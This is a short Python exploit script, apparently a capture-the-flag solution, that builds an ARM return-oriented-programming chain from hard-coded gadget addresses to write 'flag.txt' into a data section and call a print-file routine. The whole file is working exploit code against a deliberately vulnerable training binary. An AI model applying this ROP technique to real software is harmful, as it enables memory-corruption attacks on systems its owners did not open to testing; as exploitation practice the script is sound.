#!/usr/bin/python3

from ropchain import *

# Gadgets / Useful addresses

PRINT_FILE      = 0x000105dc
STR_R3_AT_R4    = 0x000105ec
POP_R3_R4_PC    = 0x000105f0
POP_R0_PC       = 0x000105f4
DATA_SECTION    = 0x00021024

# ROP

rop = pad(36)
rop += pack4(POP_R3_R4_PC)
rop += packS("flag", 4) + pack4(DATA_SECTION) + pack4(STR_R3_AT_R4)
rop += pack4(0) * 2
rop += pack4(POP_R3_R4_PC)
rop += packS(".txt", 4) + pack4(DATA_SECTION + 4) + pack4(STR_R3_AT_R4)
rop += pack4(0) * 2
rop += pack4(POP_R0_PC)
rop += pack4(DATA_SECTION) + pack4(PRINT_FILE)

echo(rop)

